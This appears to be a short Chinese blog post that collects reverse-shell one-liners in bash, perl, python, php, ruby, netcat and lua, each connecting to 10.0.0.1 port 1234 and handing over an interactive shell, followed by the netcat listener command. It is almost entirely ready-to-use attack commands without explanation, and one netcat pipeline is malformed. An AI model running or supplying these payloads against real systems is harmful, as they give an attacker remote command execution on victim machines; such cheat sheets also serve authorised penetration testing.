Title: 反弹Shell总结
Date: 2017-05-27 14:20
Modified: 2017-05-27 14:20
Category: 安全
Tags: 反弹shell
Slug: K4
Authors: nJcx
Summary: 反弹shell总结



#### 汇总

```bash

bash -i >& /dev/tcp/10.0.0.1/1234 0>&1

```

```perl

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

```python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

```php

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

```

```php
php -r 'exec("/bin/bash -i >& /dev/tcp/10.0.0.1/1234")'
```

```ruby

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

```

```bash

nc -e /bin/sh 10.0.0.1 1234

```

如果nc不支持-e，

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

```

```bash
nc 10.0.0.1 6666|/bin/bash|10.0.0.1 1234

```

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

在带有公网的机器上开启监听

```bash

nc -nvlp 1234

```